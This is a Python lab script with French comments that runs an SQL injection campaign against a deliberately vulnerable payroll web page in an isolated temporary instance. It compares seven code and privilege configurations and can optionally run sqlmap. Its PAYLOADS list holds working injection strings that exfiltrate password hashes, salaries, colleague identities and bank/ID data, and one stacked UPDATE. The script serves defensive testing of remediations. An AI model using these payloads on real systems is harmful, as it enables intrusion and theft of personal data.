#!/usr/bin/env python3
"""Phases 4 et 5 : campagne d'injection SQL contre « Mes accès », dans une instance de laboratoire jetable.

La campagne crée une instance privée NEUVE sous /tmp/securepayroll-lab-* (jamais .local/), se connecte
avec le compte le moins privilégié (employee.demo) et rejoue les mêmes charges dans sept configurations :

  A  code vulnérable           + privilèges de la phase 1 (34 GRANT directs)   avant toute correction
  E  requête préparée seule    + privilèges de la phase 1                      effet isolé de la paramétrisation
  F  validation seule          + privilèges de la phase 1                      effet isolé de la validation serveur
  G  erreurs génériques seules + privilèges de la phase 1                      effet isolé du masquage des erreurs
  B  code vulnérable           + rôles MySQL de la phase 2                     effet isolé du moindre privilège
  D  code corrigé              + privilèges de la phase 1                      les trois contrôles de code
  C  code corrigé              + rôles MySQL de la phase 2                     état final (tous les contrôles)

Usage :
  python3 lab/sqli-campaign.py                                  campagne complète (≈ 6 min)
  python3 lab/sqli-campaign.py --sqlmap                         idem, puis sqlmap sur A et C (≈ +5 min)
  python3 lab/sqli-campaign.py --instance /tmp/securepayroll-lab-XXXX
                                                                 rejouer sur une instance existante
  python3 lab/sqli-campaign.py --instance ... --serve A         démonstration au navigateur (A à G)
"""
import argparse
import html
import http.cookiejar
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request

ROOT = Path(__file__).resolve().parents[1]
PREFIX = '/tmp/securepayroll-lab-'
FLAG = 'SECUREPAYROLL_LAB_VULNERABLE'
VARIANT = 'SECUREPAYROLL_LAB_VARIANT'
LEGACY_GRANTS = ['svc_php_grants', 'advanced_hr_grants', 'compensation_grants',
                 'payroll_grants', 'settlement_grants', 'iam_grants']
# Clé → (code, privilèges, libellé). Code : variante du laboratoire (LabMode::VARIANTS) ou « corrigé ».
SCENARIOS = {
    'A': ('vulnerable', 'phase 1', 'Avant correction'),
    'E': ('prepared-only', 'phase 1', 'Requête préparée seule'),
    'F': ('validation-only', 'phase 1', 'Validation seule'),
    'G': ('generic-errors', 'phase 1', 'Erreurs génériques seules'),
    'B': ('vulnerable', 'rôles', 'Moindre privilège seul'),
    'D': ('corrigé', 'phase 1', 'Code corrigé seul'),
    'C': ('corrigé', 'rôles', 'État final'),
}
ORDER = 'AEFGBDC'
U = "CONVERT({} USING utf8mb4) COLLATE utf8mb4_0900_as_cs"   # aligne les collations pour UNION
# Les charges finissent par « -- - » : le contrôleur applique trim(), qui supprimerait l'espace
# obligatoire après « -- » ; l'attaquant le déduit du message d'erreur divulgué par la sonde P1.
PAYLOADS = [
    ('P0', 'Saisie légitime', '2026-01-01'),
    ('P1', 'Sonde : apostrophe seule', "'"),
    ('P2', 'Tautologie : rôles de tous les comptes', "2000-01-01' OR '1'='1"),
    ('P3', 'Reconnaissance : tables et colonnes visibles',
     "2999-01-01' UNION SELECT " + U.format('table_name') + ', ' + U.format('column_name')
     + ", NULL, NULL FROM information_schema.columns WHERE table_schema = DATABASE() -- -"),
    ('P4', 'Exfiltration : empreintes des mots de passe',
     "2999-01-01' UNION SELECT login, password_hash, NULL, NULL FROM accounts -- -"),
    ('P5', 'Exfiltration : salaires',
     "2999-01-01' UNION SELECT e.employee_number, sc.monthly_amount, sc.effective_on, NULL "
     "FROM salary_conditions sc JOIN employees e ON e.id = sc.employee_id -- -"),
    ('P6', 'Exfiltration : identité des collègues',
     "2999-01-01' UNION SELECT employee_number, CONCAT(first_name, ' ', last_name), NULL, NULL FROM employees -- -"),
    ('P7', 'Exfiltration : données personnelles (RIB, CIN)',
     "2999-01-01' UNION SELECT employee_id, rib, id_document_number, NULL FROM employee_personal_data -- -"),
    ('P8', 'Écriture : requête empilée',
     "2026-01-01'; UPDATE employees SET last_name = 'PIRATE' WHERE employee_number = 'EMP-2026-001'; -- -"),
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, response, code, message, headers, newurl):
        return None


class Client:
    def __init__(self, base):
        self.base, self.token = base, ''
        self.jar = http.cookiejar.CookieJar()
        self.http = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar), NoRedirect())

    def request(self, path, fields=None):
        data = None if fields is None else urllib.parse.urlencode(fields).encode()
        try:
            response = self.http.open(urllib.request.Request(self.base + path, data=data), timeout=60)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            body = response.read().decode()
            token = re.search(r'name="csrf" value="([a-f0-9]{64})"', body)
            if token:
                self.token = token[1]
            return response.status, body


def require(ok, message):
    if not ok:
        raise RuntimeError(message)


def load_initializer():
    spec = importlib.util.spec_from_file_location('local_initializer', ROOT / 'bin/init-local.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def lab_instance(module, path):
    if path is None:
        private = Path(tempfile.mkdtemp(prefix='securepayroll-lab-', dir='/tmp'))
        path = private / 'mysql'
        print('Nouvelle instance de laboratoire : ' + str(path), flush=True)
        result = subprocess.run(['python3', str(ROOT / 'bin/init-local.py'), 'init', '--directory', str(path)],
                                cwd=ROOT, env={**os.environ, 'PYTHONDONTWRITEBYTECODE': '1'})
        require(result.returncode == 0, 'Initialisation de l’instance de laboratoire')
    path = Path(path).resolve()
    require(str(path).startswith(PREFIX) and (path / 'installed.json').is_file(),
            'Instance refusée : seule une instance ' + PREFIX + '* peut recevoir le composant vulnérable.')
    instance = module.LocalInstance(path)
    instance.start()
    instance.assert_isolated()
    return instance


def set_privileges(instance, level):
    """phase 1 : rejoue les 34 GRANT directs historiques ; rôles : les retire (état installé)."""
    if level == 'phase 1':
        for name in LEGACY_GRANTS:
            instance.sql((ROOT / 'database/setup' / (name + '.sql')).read_text())
    else:
        instance.sql("REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'svc_php'@'localhost';")
    grants = instance.sql("SHOW GRANTS FOR 'svc_php'@'localhost';").splitlines()
    direct = [g for g in grants if not g.startswith('GRANT USAGE') and not g.startswith('GRANT `sp_')]
    # SHOW GRANTS fusionne les GRANT d'une même table : 34 instructions donnent 32 lignes.
    legacy = any('password_hash' in g for g in direct) and any('salary_conditions' in g for g in direct)
    require((legacy and len(direct) == 32) if level == 'phase 1' else direct == [],
            'Privilèges directs inattendus : ' + str(len(direct)))
    return len(direct)


def serve(instance, variant, port):
    env = instance.application_environment()
    if variant != 'corrigé':
        env[FLAG] = 'access-history'
        env[VARIANT] = variant
    log = open(instance.directory.parent / 'http-lab.log', 'ab')
    process = subprocess.Popen(['php', '-S', '127.0.0.1:' + str(port), '-t', 'public', 'public/index.php'],
                               cwd=ROOT, env=env, stdout=log, stderr=log)
    base = 'http://127.0.0.1:' + str(port)
    deadline = time.monotonic() + 20
    while True:
        try:
            urllib.request.urlopen(base + '/login', timeout=1).close()
            return process, base
        except urllib.error.URLError:
            require(time.monotonic() < deadline, 'Démarrage HTTP du laboratoire')
            time.sleep(.1)


def free_port():
    with socket.socket() as listener:
        listener.bind(('127.0.0.1', 0))
        return listener.getsockname()[1]


def analyse(status, body, truth):
    alerts = [html.unescape(re.sub(r'<[^>]+>', '', a)).strip()
              for a in re.findall(r'<div class="alert error" role="alert">(.*?)</div>', body, re.S)]
    banner = any('LABORATOIRE' in a or a.startswith('LAB ') for a in alerts)
    errors = [a for a in alerts if 'LABORATOIRE' not in a and not a.startswith('LAB ')]
    cells = [[html.unescape(c) for c in row] for row in re.findall(
        r'<tr><td><strong>(.*?)</strong></td><td class="mono">(.*?)</td><td class="mono">(.*?)</td>', body, re.S)]
    flat = {c for row in cells for c in row}
    code = re.search(r'SQLSTATE\[[0-9A-Z]{5}\]: [^:]+: (\d{4})', errors[0]) if errors else None
    return {
        'http': status, 'lab_banner': banner, 'rows': len(cells),
        'mysql_error': int(code[1]) if code else None,
        'message': errors[0][:400] if errors else None,
        'leaks': {
            'other_accounts_roles': len(cells) > truth['own_roles'] and not (flat & (truth['salaries'] | truth['colleagues'])),
            'password_hashes': sum(1 for c in flat if c.startswith('$argon2id$')),
            'salaries': len(truth['salaries'] & flat),
            'colleagues': len(truth['colleagues'] & flat),
            'personal_data': len(truth['ribs'] & flat),
            'schema_tables': len({r[0] for r in cells if r[0] in truth['tables']}),
        },
        'sample': [r[:2] for r in cells[:3]],
    }


def ground_truth(instance):
    q = lambda s: [line for line in instance.sql('USE secure_payroll; ' + s).splitlines() if line]
    return {
        'own_roles': int(q("SELECT COUNT(*) FROM role_assignments ra JOIN accounts a ON a.id = ra.account_id "
                           "WHERE a.login = 'employee.demo' AND ra.valid_from >= '2000-01-01';")[0]),
        'role_codes': set(q('SELECT code FROM roles;')),
        'salaries': set(q('SELECT monthly_amount FROM salary_conditions;')),
        'colleagues': set(q("SELECT employee_number FROM employees WHERE employee_number <> 'EMP-2026-001';")),
        'ribs': set(q('SELECT rib FROM employee_personal_data;')),
        'tables': set(q("SELECT table_name FROM information_schema.tables WHERE table_schema = 'secure_payroll';")),
    }


def fingerprint(instance):
    return instance.sql('USE secure_payroll; CHECKSUM TABLE employees, accounts, role_assignments, salary_conditions;')


def run_scenario(instance, key, credentials, truth):
    variant, level, label = SCENARIOS[key]
    set_privileges(instance, level)
    before = fingerprint(instance)
    process, base = serve(instance, variant, free_port())
    try:
        client = Client(base)
        client.request('/login')
        status, _ = client.request('/login', dict(csrf=client.token, login='employee.demo',
                                                   password=credentials['employee.demo']))
        require(status == 303, 'Connexion employee.demo')
        results = {}
        for name, _, payload in PAYLOADS:
            status, body = client.request('/my-access?' + urllib.parse.urlencode({'since': payload}))
            results[name] = analyse(status, body, truth)
    finally:
        process.terminate()
        process.wait(timeout=10)
    results['unchanged'] = fingerprint(instance) == before
    print('Scénario ' + key + ' (' + label + ') terminé.', flush=True)
    return results


def verdict(name, r):
    leaks = r['leaks']
    if r['http'] == 422:
        return 'refusé (422)'
    if r['mysql_error']:
        return 'erreur MySQL ' + str(r['mysql_error'])
    generic = r['message'] is not None and 'SQLSTATE' not in r['message']
    found = [k for k, v in [('empreintes', leaks['password_hashes']), ('salaires', leaks['salaries']),
                            ('collègues', leaks['colleagues']), ('RIB', leaks['personal_data']),
                            ('tables', leaks['schema_tables'])] if v]
    if leaks['other_accounts_roles'] and not found:
        found.append('rôles d’autrui')
    return ('FUITE : ' + ', '.join(f'{k} ({leaks[m]})' if m else k for k, m in
                                    [(f, {'empreintes': 'password_hashes', 'salaires': 'salaries',
                                          'collègues': 'colleagues', 'RIB': 'personal_data',
                                          'tables': 'schema_tables'}.get(f)) for f in found])
            if found else ('erreur générique' if generic else str(r['rows']) + ' ligne(s)'))


def no_leak(r):
    return not any(r['leaks'].values())


def expectations(report):
    a, b, c, d, e, f, g = (report[k] for k in 'ABCDEFG')
    attacks = [x[0] for x in PAYLOADS[1:]]
    checks = [
        ('A : bandeau de laboratoire affiché', all(r['lab_banner'] for k, r in a.items() if k.startswith('P'))),
        ('A : saisie légitime fonctionnelle', a['P0']['http'] == 200 and a['P0']['rows'] == a['P0']['rows'] >= 1),
        ('A : message SQL brut divulgué', a['P1']['mysql_error'] == 1064),
        ('A : tautologie, rôles de tous les comptes', a['P2']['leaks']['other_accounts_roles']),
        ('A : empreintes de mots de passe exfiltrées', a['P4']['leaks']['password_hashes'] >= 6),
        ('A : salaires exfiltrés', a['P5']['leaks']['salaries'] >= 1),
        ('A : données personnelles protégées dès la phase 1 (1142)', a['P7']['mysql_error'] == 1142),
        ('A : requête empilée impossible (préparation native)', a['P8']['mysql_error'] == 1064),
        ('B : empreintes refusées par MySQL (1143)', b['P4']['mysql_error'] == 1143),
        ('B : salaires refusés par MySQL (1142)', b['P5']['mysql_error'] == 1142),
        ('B : reconnaissance réduite', b['P3']['leaks']['schema_tables'] < a['P3']['leaks']['schema_tables']),
        ('B : MAIS identité des collègues encore exfiltrée', b['P6']['leaks']['colleagues'] >= 1),
        ('B : MAIS rôles de tous les comptes encore visibles', b['P2']['leaks']['other_accounts_roles']),
        ('C et D : aucune charge acceptée (422), aucune fuite',
         all(r[p]['http'] == 422 and r[p]['mysql_error'] is None and not any(r[p]['leaks'].values())
             for r in (c, d) for p in [x[0] for x in PAYLOADS[1:]])),
        ('C et D : saisie légitime fonctionnelle, sans bandeau',
         all(r['P0']['http'] == 200 and r['P0']['rows'] >= 1 and not r['P0']['lab_banner'] for r in (c, d))),
        # Phase 5 : effet isolé de chaque contrôle de code, avec les privilèges larges de la phase 1.
        ('E (préparée seule) : aucune fuite pour aucune charge', all(no_leak(e[p]) for p in attacks)),
        ('E (préparée seule) : aucune charge analysée comme du SQL (ni 1064, ni UNION exécutée)',
         all(e[p]['mysql_error'] != 1064 for p in attacks)),
        ('E (préparée seule) : saisie légitime fonctionnelle', e['P0']['http'] == 200 and e['P0']['rows'] >= 1),
        ('F (validation seule) : toutes les charges refusées (422) avant la base',
         all(f[p]['http'] == 422 and no_leak(f[p]) and f[p]['mysql_error'] is None for p in attacks)),
        ('F (validation seule) : saisie légitime fonctionnelle', f['P0']['http'] == 200 and f['P0']['rows'] >= 1),
        ('G (erreurs génériques seules) : plus aucun message du SGBD',
         all(g[p]['mysql_error'] is None and 'SQLSTATE' not in (g[p]['message'] or '') for p in ['P0', *attacks])),
        ('G (erreurs génériques seules) : MAIS empreintes et salaires toujours exfiltrés',
         g['P4']['leaks']['password_hashes'] >= 6 and g['P5']['leaks']['salaries'] >= 1),
        ('Aucune donnée modifiée dans les 7 scénarios', all(report[k]['unchanged'] for k in ORDER)),
    ]
    return checks


def run_sqlmap(instance, key, credentials, port):
    """Même outil, même cible, même paramètre : seul le scénario change (A avant, C après)."""
    variant, level, label = SCENARIOS[key]
    set_privileges(instance, level)
    process, base = serve(instance, variant, port)
    output = instance.directory.parent / ('sqlmap-' + key)
    try:
        client = Client(base)
        client.request('/login')
        status, _ = client.request('/login', dict(csrf=client.token, login='employee.demo',
                                                   password=credentials['employee.demo']))
        require(status == 303, 'Connexion employee.demo')
        cookie = '; '.join(c.name + '=' + c.value for c in client.jar)
        command = ['sqlmap', '-u', base + '/my-access?since=2026-01-01', '-p', 'since', '--cookie', cookie,
                   '--batch', '--dbms=MySQL', '--level=1', '--risk=1', '--flush-session', '--disable-coloring',
                   '--output-dir', str(output), '--current-user', '--current-db']
        result = subprocess.run(command, capture_output=True, text=True, timeout=1200,
                                env={**os.environ, 'HOME': str(instance.directory.parent)})
    finally:
        process.terminate()
        process.wait(timeout=10)
    text = result.stdout.replace(cookie, '<cookie de session>')
    log = instance.directory.parent / ('sqlmap-' + key + '.txt')
    log.write_text(' '.join(c if c != cookie else '<cookie>' for c in command) + '\n\n' + text)
    os.chmod(log, 0o600)
    techniques = re.findall(r'^\s+Type: (.+)$', text, re.M)
    user = re.search(r"current user: '([^']*)'", text)
    print('sqlmap sur ' + key + ' (' + label + ') terminé : ' + str(log), flush=True)
    return {'injectable': 'identified the following injection point' in text,
            'not_injectable': 'do not appear to be injectable' in text,
            'techniques': techniques, 'current_user': user[1] if user else None, 'log': str(log)}


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('--instance', help='instance de laboratoire existante (' + PREFIX + '*/mysql)')
    parser.add_argument('--serve', choices=list(SCENARIOS), help='servir un scénario pour une démonstration manuelle')
    parser.add_argument('--port', type=int, default=8090)
    parser.add_argument('--sqlmap', action='store_true', help='rejouer aussi sqlmap sur A (avant) et C (après)')
    args = parser.parse_args()
    module = load_initializer()
    instance = lab_instance(module, args.instance)
    credentials = instance.read_private('credentials.json')
    if args.serve:
        variant, level, label = SCENARIOS[args.serve]
        set_privileges(instance, level)
        process, base = serve(instance, variant, args.port)
        print(f'Scénario {args.serve} ({label}) : code {variant}, privilèges {level}.')
        print('Ouvrir ' + base + '/login, compte employee.demo, puis le menu « Mes accès ».')
        if sys.stdout.isatty():
            print('Mot de passe de employee.demo (instance de laboratoire) : ' + credentials['employee.demo'])
        print('Ctrl+C pour arrêter ; MySQL reste actif : python3 bin/init-local.py stop --directory ' + str(instance.directory))
        try:
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
        return 0
    truth = ground_truth(instance)
    report = {key: run_scenario(instance, key, credentials, truth) for key in ORDER}
    checks = expectations(report)
    tools = {}
    if args.sqlmap:
        require(shutil.which('sqlmap') is not None, 'sqlmap absent')
        tools = {key: run_sqlmap(instance, key, credentials, free_port()) for key in 'AC'}
        checks += [
            ('sqlmap sur A : paramètre since injectable', tools['A']['injectable'] and len(tools['A']['techniques']) >= 1),
            ('sqlmap sur A : compte MySQL de l’application obtenu', tools['A']['current_user'] is not None),
            ('sqlmap sur C : aucun paramètre injectable', tools['C']['not_injectable'] and not tools['C']['injectable']),
        ]
    set_privileges(instance, 'rôles')   # l'instance revient à l'état installé
    print('\n| Charge | ' + ' | '.join(f'{k} : {SCENARIOS[k][2]}' for k in ORDER) + ' |')
    print('|---|' + '---|' * len(ORDER))
    for name, label, _ in PAYLOADS:
        print(f'| {name} {label} | ' + ' | '.join(verdict(name, report[k][name]) for k in ORDER) + ' |')
    for key, tool in tools.items():
        print(f'sqlmap {key} : ' + ('INJECTABLE — ' + ' ; '.join(tool['techniques']) + ' ; utilisateur ' + str(tool['current_user'])
                                    if tool['injectable'] else 'non injectable'))
    print()
    for label, ok in checks:
        print(('PASS ' if ok else 'FAIL ') + label)
    target = instance.directory.parent / 'sqli-campaign.json'
    target.write_text(json.dumps({'instance': str(instance.directory), 'payloads': PAYLOADS,
                                  'scenarios': SCENARIOS, 'results': report, 'sqlmap': tools,
                                  'checks': checks}, ensure_ascii=False, indent=2))
    os.chmod(target, 0o600)
    instance.stop()
    passed = all(ok for _, ok in checks)
    print(json.dumps({'passed': passed, 'checks': len(checks), 'report': str(target),
                      'instance': str(instance.directory)}, ensure_ascii=False))
    return 0 if passed else 1


if __name__ == '__main__':
    os.umask(0o077)
    try:
        sys.exit(main())
    except (RuntimeError, OSError, subprocess.SubprocessError) as error:
        print('Campagne interrompue : ' + str(error), file=sys.stderr)
        sys.exit(1)
